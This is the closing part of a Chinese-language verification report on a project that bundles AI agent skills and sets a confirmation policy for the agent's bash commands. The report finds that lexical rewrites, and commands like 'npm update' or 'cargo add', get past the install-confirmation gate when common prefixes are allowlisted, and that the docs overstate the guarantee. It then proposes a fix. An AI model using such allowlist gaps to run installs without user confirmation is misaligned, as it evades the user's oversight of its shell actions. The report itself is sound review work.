**Why human:** 打包态进程内状态无法由纯 Node 测试进程读取，且 `tests/test-builtin-skills-seeder.js` 的 opt-in 组**显式声明刻意不复刻该结论**（「避免制造虚假的自动化」）。执行者已实跑取得该证据（47-04-SUMMARY Task 3），本次验证为不干扰用户生产实例而未启动 GUI。hermetic 纵切测试已对**同一份内容**证明零诊断 + 空 prompt，残余风险仅限「打包路径分支解析」这一环，而该环已由 unpacked 面（21 文件）+ `realm-nightly` userData 播种结果间接佐证。

#### 2. 打包 .app 上的「第二次启动不重建」

**Test:** 在打包 .app 上连续启动两次，比对第二次启动后 `managed-skills/<name>/SKILL.md` 的 inode。
**Expected:** 修复 gaps #2 后 inode 不变；当前实测会重建。
**Why human:** 需要真实 .app 的多次启动时序。本次已在纯 Node 环境用 seeder 直接证伪（inode `171120956→171120958`），故该判定问题已闭合；待 gaps #2 修复后应转为机械断言。

---

### Gaps Summary

阶段目标拆成两半，**达成情况不对称**：

**第一半（技能侧）—— 达成。** 全 21 个随包文件齐备，17 个上游快照文件经独立 sha256 比对 17/17 与固定 SHA 逐字节相同，`SKILL.md` 的偏离恰为声明的那组受控改动，安装语义扫描零命中，`disable-model-invocation` 与中文 description 双技能齐备，打包两面（unpacked 21 文件 / asar 排除项 8 类全 0 + 自家交付物在列）与运行期播种均可实证，归属声明的五要素与两个固定 SHA 经外部源复核一致。四条 Warning 集中在该半的**健壮性与文档准确性**（残留清收、幂等写入、静默失败、归属行过期、探针依赖映射错误），不改变「技能可用且零安装语义」的结论。

**第二半（bash 侧）—— 未达成。** 安装档的实现本身质量高（13 家族全覆盖、只读反例零误伤、danger 优先、四函数零改动、70 例测试全绿、确认卡片三分支齐备），但**保证的强度不够**：目标是「不再**可能**被白名单免确认」，实测任何不改首 token 的纯词法改写都能同时命中白名单前缀、避开安装档子命令匹配，拿到 `level:'allow'` —— 用户看不到任何卡片，而 shell 执行的是与 `brew install wget` argv 完全相同的安装命令。触发前提（把裸 `brew` / `npm` 加白名单）**正是本阶段自己的文档给出的推荐配置**，且第二绕过家族（`npm update` / `cargo add` / `go get` / `yarn workspace app add`）无需任何引号技巧、是模型自然会产出的真实安装命令。三份文档（`AGENTS.md`、`ai-agent-workspace.md §四§五§七`、`ai-skills.md §九`）与代码注释（`ai-bash-policy.js:233`）共同把「白名单不可越过安装档 / 漏检 ≠ 免确认」当作机械结论声明，因此这不只是实现缺口，也是**文档在提供虚假保证**。

**收敛路径**：`/gsd-plan-phase 47 --gaps` —— 建议按 REVIEW CR-01 的单一修法收敛（安装档改为「首 token 是包管理器 → 默认强制确认，仅显式只读子命令降级」+ 两侧共用规范化），可一次覆盖两个绕过家族且不动 47-02 锁定的四函数不变式；同时修 gaps #2/#3/#4（same 跳过重建 + 启动清扫残留 + 失败路径 console 兜底）与文档/归属的 4 条准确性 Warning。若团队判定接受词法边界，则**必须**改写三份文档的绝对化承诺、补一条钉住实际行为的断言，并在 frontmatter `overrides:` 归档。

---

_Verified: 2026-09-11T21:40:00Z_
_Verifier: Claude (gsd-verifier)_
